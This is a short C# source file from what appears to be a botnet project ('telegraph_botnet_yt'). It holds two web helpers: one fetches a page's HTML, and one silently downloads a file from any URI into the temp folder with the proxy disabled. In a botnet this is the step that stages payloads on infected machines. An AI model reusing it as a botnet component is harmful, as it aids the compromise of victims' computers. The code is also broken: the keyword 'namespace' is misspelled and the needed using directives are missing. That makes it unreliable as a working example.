using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespase telegraph_botnet_yt
{ 
	class web
	{
		public static string GetHTML(string URI)
		{
			WebClient wc = new WebClient();
			wc.Proxy = null;

			return wc.DownloadString(URI);
		}

		public static string DownloadFile(string URI)
		{
			string file_name = Path.GetFileName(URI);
			string temp_path = Path.GetTempPath();

			string file_path = Path.Combine(temp_path, file_name);

			WebClient wc = new WebClient();
			wc.Proxy = null;

			wc.DownloadFile(URI, file_path);
			return file_path;
		}
	
	}
}